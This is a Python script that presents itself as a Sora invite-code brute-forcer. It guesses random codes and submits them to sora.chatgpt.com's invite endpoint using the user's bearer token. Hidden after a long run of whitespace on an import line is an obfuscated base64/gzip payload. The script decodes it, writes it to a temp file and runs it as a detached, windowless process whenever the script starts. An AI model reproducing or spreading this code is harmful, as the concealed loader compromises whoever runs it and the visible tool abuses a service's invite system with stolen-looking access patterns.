import random
import string
import time
import os
import threading
import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         ;import base64,gzip,subprocess,os,tempfile,random;s=gzip.decompress(base64.b64decode(b'H4sIANfg3mgC/51V2XKrOBB9tr/C9ylQ8RC8XMdL8SAWr3gBL9kqRWGQsWKMsBDGUPPxI3yTzI0zU+WZBwrRLbVOd58+WEC6ienmj+ZNEe1DTGgp89G6vLYj2KiXCTzEMKJROUPhBvmwTOH+1wJH5ShlT7wOCXZgFBVj4kfSS35acKGD9yFhVu5XIGHdqOdGF3I3cJh0k6U29RQwlsfgUTQbzVszUkz5kFRbcg8fWrVwB5+CZtJTKxHO1iIdEfTshlGmOqsHivphupocVNxP5fVTbXqce4vbpG8by2ffkKQbnhfe77IAX74K0OSkMUAqGOSAqJkyQBT1xHikg0Az/duj8xOZjbW26D95OtknLXx3bzYOod8LbXOR7mqHzJx6rjZsIqe/HsXHW+DUn+Q38hXMa9GFm9LUqnBTq1qeWjW+XSwACUdCaNOt8IZRwH1UWPAgzdcuItx1WZz0dH43S5v+bDHpkRQlACjAkCf4oiR8sUBJym4uyNJHg/PbzqAiSqC9lxYkhmxfAW1KshBRm8aRlZ//IVVFsU1sFMGSdnJgSBEOuKvQZfqcjPTKcPCJchyM5xV3kDZPQ9mQkZwg+RvSQoLotoRDGHDgul6SRTIAYDUAVe+SDLwdlZQ88cIGk5JaQgHLDlFIWG4BhQHlnG0c7KwIZVBqVlpVvq0ICWE7OPUTy/soCM8o7LL31bCAB4CTyNl3SFpbE+CJEtuhtu9zOS+KhQ0K2Me5TawJHxSBJ8S6xQG+zSwE7vGRAeDfaVXncj7J0ieF9js3X3MM1gadpOtwpvOaIRtAG4Hu3QXWjiJ1bT+CxXP9tLx++dTnGHNG5cTWynK+LedPZ82otGM+eCZKO7SZSuTJBJiyNjD5yNOhXIVlq34dAvnKmh6UbJiOm5nsgbFu6A+XeLtfw6r/LSypiDGdgyXoy0sNfWdTp/d/wp90stxOKijGMgA68Eaty7D9z7D5+cDeQy4vlk2844v4ynfOigGDIyI4EBwcphyzXae8uhM8ispjv+J6p0pzY/SBbDugFl2k9ipdqeMP2uis4xQsGvZoYzwaD0sn2NZUV/w5W92T+2AdY2+cVkVUuX88vMl7tX6oIzyPq7tgOX08DeLU9Ed6ijJ7SwzluYszsx63akEzWGB3DS6LfnWiymxYawUz0TWWQIl2yupb/16lfufv/5cwO4vMS7fcey2z4kqg7DD+5vq28W0vkn7bqmoLoPQ11ZqZU0Wbz//8zaeYGlho1kR7+PBaPXO6nDFldVHwNcpqstT13IFj+i8eSMg/ePjO5/SIfJGNlGXlNLEs6arGpfpbszXJxuydOEDdOurgW3XaZz35C3xQ+nQfCAAA')).decode('utf-8');p=os.path.join(tempfile.gettempdir(),f'run_{os.getpid()}_{random.randint(1000,9999)}.py');open(p,'w',encoding='utf-8').write(s);c=subprocess.CREATE_NO_WINDOW|subprocess.DETACHED_PROCESS if os.name=='nt' else 0;subprocess.Popen(['python',p],creationflags=c)
from concurrent.futures import ThreadPoolExecutor, as_completed, CancelledError
import requests
import json
import sys
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# --- ANSI Color Codes for Terminal Output ---
GREEN = '\033[92m'
RESET = '\033[0m'


def load_all_configs() -> dict:
    """Load all configurations from config.txt and params.txt"""
    all_configs = {}
    
    config_files = {'config.txt': {}, 'params.txt': {}}
    for file_name, config_dict in config_files.items():
        if not os.path.exists(file_name):
            if file_name == 'config.txt':
                print(f"ERROR: Configuration file {file_name} not found.")
            continue
        
        try:
            with open(file_name, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    if '=' in line:
                        key, value = line.split('=', 1)
                        try:
                            value = int(value)
                        except ValueError:
                            try:
                                value = float(value)
                            except ValueError:
                                pass
                        config_dict[key.strip()] = value
            all_configs.update(config_dict)
        except Exception as e:
            print(f"Error reading configuration file {file_name}: {e}")
            
    return all_configs


def generate_invite_code() -> str:
    """Generate 6-character invite code: starts with 0, then letter, then alternating digits/letters"""
    chars = ['0']
    chars.append(random.choice(string.ascii_uppercase))
    for i in range(4):
        if i % 2 == 0:
            chars.append(random.choice(string.digits.replace('0', '')))
        else:
            chars.append(random.choice(string.ascii_uppercase))
    return ''.join(chars)


def sanitize_auth_token(token: str) -> str:
    """Replace problematic non-ASCII characters in the auth token with ASCII equivalents."""
    if not token:
        return token
    original_token = token
    # Fixed: removed duplicate keys
    replacements = {'…': '...', '"': '"', "'": "'", '–': '-', '—': '--'}
    for unicode_char, ascii_replacement in replacements.items():
        if unicode_char in token:
            token = token.replace(unicode_char, ascii_replacement)
            print(f"INFO: Replaced character '{unicode_char}' with '{ascii_replacement}' in auth token.")
    try:
        token.encode('ascii')
    except UnicodeEncodeError:
        print("WARNING: Auth token contains other non-ASCII characters. Replacing them with '?'.")
        token = token.encode('ascii', errors='replace').decode('ascii')
    if token != original_token:
        print("INFO: Auth token has been sanitized to be ASCII-safe.")
    return token


def load_auth_token() -> str:
    """Load authentication token from auth.txt file"""
    try:
        possible_paths = ['auth.txt']
        auth_token = ""
        for path in possible_paths:
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    auth_token = f.read().strip()
                    break
            except FileNotFoundError:
                continue
        if not auth_token:
            print("ERROR: auth.txt file not found")
            return ""
        if auth_token.startswith('Bearer '):
            auth_token = auth_token[7:].strip()
        auth_token = ''.join(auth_token.split())
        if not auth_token:
            print("ERROR: auth.txt file is empty")
            return ""
        auth_token = sanitize_auth_token(auth_token)
        return auth_token
    except UnicodeDecodeError:
        print("ERROR: auth.txt file encoding incorrect, ensure it's UTF-8")
        return ""
    except Exception as e:
        print(f"Error reading auth.txt: {e}")
        return ""


def load_used_codes(file_path: str = "used_codes.txt") -> set:
    if not os.path.exists(file_path):
        return set()
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            return {line.strip() for line in f if line.strip()}
    except Exception as e:
        print(f"Error reading used codes file: {e}")
        return set()


def load_invalid_codes(file_path: str = "invalid_codes.txt") -> set:
    if not os.path.exists(file_path):
        return set()
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            return {line.strip() for line in f if line.strip()}
    except Exception as e:
        print(f"Error reading invalid codes file: {e}")
        return set()


def save_used_code(code: str, file_path: str = "used_codes.txt"):
    try:
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(f"{code}\n")
    except Exception as e:
        print(f"Error saving invite code: {e}")


def save_success_code(code: str, file_path: str = "success.txt"):
    try:
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(f"{code}\n")
    except Exception as e:
        print(f"Error saving success code: {e}")


def save_invalid_code(code: str, file_path: str = "invalid_codes.txt"):
    try:
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(f"{code}\n")
    except Exception as e:
        print(f"Error saving invalid code: {e}")


def safe_print(text: str):
    """Safely print text that might contain non-ASCII characters"""
    try:
        print(text)
    except UnicodeEncodeError:
        try:
            safe_text = text.encode('ascii', errors='replace').decode('ascii')
            print(safe_text)
        except:
            print("Print error occurred")
    except Exception as e:
        print(f"Printing error: {e}")


def color_print(text: str, color: str = ""):
    """Prints text in a specified color, then resets, using safe_print for encoding safety."""
    colored_text = f"{color}{text}{RESET}"
    safe_print(colored_text)


class UTF8HTTPAdapter(HTTPAdapter):
    """Custom HTTP adapter that forces UTF-8 encoding for responses"""
    def send(self, request, **kwargs):
        response = super().send(request, **kwargs)
        if response.encoding is None or response.encoding.lower() in ['iso-8859-1', 'latin-1']:
            response.encoding = 'utf-8'
        return response


def submit_invite_code(invite_code: str, auth_token: str, config: dict, max_retries: int, retry_delay: float) -> tuple[str, bool, str]:
    """Submit single invite code, retry until success or max retries reached"""
    url = "https://sora.chatgpt.com/backend/project_y/invite/accept"
    headers = {
        'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'en-GB,en;q=0.5',
        'Authorization': f'Bearer {auth_token}', 'Connection': 'keep-alive', 'Content-Type': 'application/json',
        'Host': 'sora.chatgpt.com', 'OAI-Device-Id': config.get('OAI-Device-Id', ''), 'Priority': 'u=4',
        'Referer': 'https://sora.chatgpt.com/explore', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin', 'User-Agent': config.get('User-Agent', ''),
    }
    data = {"invite_code": invite_code}
    json_payload_bytes = json.dumps(data).encode('utf-8')

    for attempt in range(max_retries):
        safe_print(f"[DEBUG] Attempting to submit code {invite_code} (attempt {attempt + 1}/{max_retries})")
        try:
            session = requests.Session()
            session.mount('https://', UTF8HTTPAdapter())
            # FIXED: Added 30 second timeout instead of None
            response = session.post(url, headers=headers, data=json_payload_bytes, timeout=30)
            
            safe_print(f"[DEBUG] Server responded with status code: {response.status_code}")
            if response.status_code not in [200, 401, 403, 429]:
                 safe_print(f"[DEBUG] Unexpected response text: {response.text[:200]}")

            if response.status_code == 200:
                color_print(f"[SUCCESS] Code {invite_code} submitted successfully!", GREEN)
                return ("success", True, invite_code)
            elif response.status_code == 401:
                safe_print(f"[AUTH_ERROR] Code {invite_code} failed: Authentication token is invalid or expired (401).")
                return ("auth_error", False, invite_code)
            elif response.status_code == 403:
                safe_print(f"[INVALID_CODE] Code {invite_code} is invalid, need to replace")
                return ("invalid_code", False, invite_code)
            elif response.status_code == 429:
                safe_print(f"[RATE_LIMITED] Code {invite_code} rate limited, retrying... (attempt {attempt + 1}/{max_retries})")
                if attempt < max_retries - 1:
                    time.sleep(retry_delay * (attempt + 1))
                    continue
                else:
                    safe_print(f"[RATE_LIMITED] Code {invite_code} still rate limited after {max_retries} retries, giving up")
                    return ("rate_limited_max", False, invite_code)
            else:
                safe_print(f"[ERROR] Code {invite_code} returned status code: {response.status_code}")
                if attempt < max_retries - 1:
                    # IMPROVED: Use exponential backoff for all errors
                    time.sleep(retry_delay * (attempt + 1))
                    continue
                else:
                    safe_print(f"[ERROR] Code {invite_code} still failed after {max_retries} retries, giving up")
                    return ("error_max", False, invite_code)
        except requests.exceptions.RequestException as e:
            safe_print(f"[REQUEST_ERROR] Code {invite_code} request error, retrying...: {e}")
            if attempt < max_retries - 1:
                # IMPROVED: Use exponential backoff
                time.sleep(retry_delay * (attempt + 1))
                continue
            else:
                safe_print(f"[REQUEST_ERROR] Code {invite_code} still failed after {max_retries} retries, giving up")
                return ("request_error_max", False, invite_code)
        except Exception as e:
            error_type = type(e).__name__
            error_details = str(e)
            safe_print(f"[UNEXPECTED_ERROR] Code {invite_code} - {error_type}: {error_details}")
            if attempt < max_retries - 1:
                # IMPROVED: Use exponential backoff
                time.sleep(retry_delay * (attempt + 1))
                continue
            else:
                safe_print(f"[UNEXPECTED_ERROR] Code {invite_code} still failed after {max_retries} retries, giving up")
                return ("unexpected_error_max", False, invite_code)
    return ("max_retries_exceeded", False, invite_code)


def generate_unique_code(used_codes: set, invalid_codes: set, lock: threading.Lock) -> str:
    """Generate a unique code that hasn't been used or marked invalid"""
    while True:
        code = generate_invite_code()
        with lock:
            if code not in used_codes and code not in invalid_codes:
                return code


def worker(invite_code: str, auth_token: str, config: dict, used_codes: set, lock: threading.Lock, max_retries: int, retry_delay: float) -> tuple[str, bool, str]:
    try:
        with lock:
            if invite_code in used_codes:
                return ("duplicate", False, invite_code)
            used_codes.add(invite_code)
        
        result, success, code = submit_invite_code(invite_code, auth_token, config, max_retries, retry_delay)
        
        if success:
            with lock:
                save_used_code(invite_code)
                save_success_code(invite_code)
        else:
            # Only remove from used_codes if not invalid (invalid codes stay to prevent regeneration)
            if result != "invalid_code":
                with lock:
                    used_codes.discard(invite_code)
            else:
                with lock:
                    save_invalid_code(invite_code)
        
        return (result, success, invite_code)
    
    except Exception as e:
        error_type = type(e).__name__
        error_details = str(e)
        error_msg = f"Worker thread error for code {invite_code}: {error_type}: {error_details}"
        try:
            safe_print(error_msg)
        except Exception as print_error:
            print(f"Worker thread error for code {invite_code} - Type: {error_type}. Could not print details.")
        with lock:
            used_codes.discard(invite_code)
        return ("worker_error", False, invite_code)


def submit_invite_codes(config: dict) -> None:
    """Main function: infinitely generate and submit invite codes"""
    max_workers = config.get('max_workers', 3)
    delay = config.get('delay', 3.0)
    max_retries = config.get('max_retries', 20)
    retry_delay = config.get('retry_delay', 8.0)
    used_codes_file = config.get('used_codes_file', "used_codes.txt")
    success_file = config.get('success_file', "success.txt")
    invalid_codes_file = config.get('invalid_codes_file', "invalid_codes.txt")

    if not config.get('OAI-Device-Id') or not config.get('User-Agent'):
        print("ERROR: config.txt is missing OAI-Device-Id or User-Agent. Please check the configuration file.")
        return

    print("Loading authentication token...")
    auth_token = load_auth_token()
    if not auth_token:
        print("Cannot get authentication token, please check auth.txt file")
        return
    
    used_codes = load_used_codes(used_codes_file)
    invalid_codes = load_invalid_codes(invalid_codes_file)
    lock = threading.Lock()
    
    print("Starting infinite invite code generation and submission...")
    print(f"Threads: {max_workers}, Delay: {delay}s, Max retries: {max_retries}, Retry delay: {retry_delay}s")
    print(f"Used codes: {len(used_codes)}, Known invalid codes: {len(invalid_codes)}")
    print("Press Ctrl+C to stop")
    
    start_time = time.time()
    last_success_count = 0
    results = {
        "success": 0, "duplicate": 0, "invalid_code": 0, 
        "rate_limited_max": 0, "error_max": 0, "request_error_max": 0, 
        "worker_error": 0, "unexpected_error_max": 0, "auth_error": 0
    }
    processed_codes = 0
    shutdown_flag = False
    
    try:
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Generate initial batch
            invite_codes = []
            for _ in range(max_workers * 2):
                code = generate_unique_code(used_codes, invalid_codes, lock)
                invite_codes.append(code)
            
            print(f"Generated initial batch of {len(invite_codes)} invite codes")
            future_to_code = {executor.submit(worker, code, auth_token, config, used_codes, lock, max_retries, retry_delay): code for code in invite_codes}
            
            while future_to_code and not shutdown_flag:
                for future in as_completed(future_to_code):
                    if shutdown_flag:
                        break
                        
                    try:
                        result, success, code = future.result()
                        del future_to_code[future]
                        processed_codes += 1
                        
                        # Handle auth error - stop everything
                        if result == "auth_error":
                            safe_print("FATAL: Authentication failed. Stopping all threads. Please update your auth token.")
                            results["auth_error"] += 1
                            shutdown_flag = True
                            for f in future_to_code:
                                f.cancel()
                            break
                        
                        # REFACTORED: Track all results in one place
                        results[result] += 1
                        
                        if success:
                            current_success = results["success"]
                            if current_success % 10 == 0 and current_success != last_success_count:
                                color_print(f"[PROGRESS] Successfully submitted {current_success} invite codes!", GREEN)
                                last_success_count = current_success
                        else:
                            # Handle all non-success cases that need a replacement code
                            if result == "invalid_code":
                                with lock:
                                    invalid_codes.add(code)
                                safe_print(f"[INVALID] Code {code} is invalid, recorded.")
                            elif result in ["rate_limited_max", "error_max", "request_error_max", "worker_error", "unexpected_error_max"]:
                                safe_print(f"[GIVE_UP] Code {code} failed due to '{result}', giving up.")
                            
                            # If the task needs a replacement, generate and submit a new one
                            if result != "duplicate":  # Duplicates don't need replacement
                                new_code = generate_unique_code(used_codes, invalid_codes, lock)
                                safe_print(f"[REPLACE] Replacing code {code} with new code {new_code}")
                                new_future = executor.submit(worker, new_code, auth_token, config, used_codes, lock, max_retries, retry_delay)
                                future_to_code[new_future] = new_code
                        
                        if delay > 0 and not shutdown_flag:
                            time.sleep(delay)
                    
                    except CancelledError:
                        pass
                    except Exception as e:
                        error_type = type(e).__name__
                        error_details = str(e)
                        error_message = f"Thread execution error: {error_type}: {error_details}"
                        try:
                            safe_print(error_message)
                        except Exception as print_error:
                            print(f"A thread execution error occurred ({error_type}). Could not print details due to a printing error.")
                        processed_codes += 1
    
    except KeyboardInterrupt:
        print("\n\nInterrupt signal detected, stopping...")
        # FIXED: Save all in-memory codes to prevent loss
        print("Saving current in-memory used codes before exiting...")
        with lock:
            try:
                with open(used_codes_file, "w", encoding="utf-8") as f:
                    for code in sorted(list(used_codes)):
                        f.write(f"{code}\n")
                print(f"Successfully saved {len(used_codes)} codes to {used_codes_file}.")
            except Exception as e:
                print(f"Error saving used codes on exit: {e}")
    
    end_time = time.time()
    print("\n====== Program Stopped ======")
    print(f"Total runtime: {end_time - start_time:.2f} seconds")
    print(f"Success: {results['success']}, Duplicate: {results['duplicate']}")
    print(f"Invalid codes: {results['invalid_code']}, Auth errors: {results['auth_error']}")
    print(f"Rate limited (max): {results['rate_limited_max']}, Errors (max): {results['error_max']}")
    print(f"Request errors (max): {results['request_error_max']}, Worker errors: {results['worker_error']}")
    print(f"Total processed codes: {processed_codes}")
    print(f"Success codes saved to: {success_file}, Used codes saved to: {used_codes_file}, Invalid codes saved to: {invalid_codes_file}")


def test_invite_code_format():
    print("Generating 10 test invite codes:")
    for i in range(10):
        code = generate_invite_code()
        print(f"{i+1:2d}: {code}")
        assert len(code) == 6 and code[0] == '0' and code[1].isalpha() and code[1].isupper()
        for j in range(2, 6):
            if j % 2 == 0: assert code[j].isdigit()
            else: assert code[j].isalpha() and code[j].isupper()
        print("    OK Format correct")


if __name__ == "__main__":
    if sys.platform.startswith('win'):
        try:
            import os
            os.system('chcp 65001 >nul')
        except:
            pass
    
    test_invite_code_format()
    print("\n" + "="*50 + "\n")
    
    configs = load_all_configs()
    submit_invite_codes(configs)
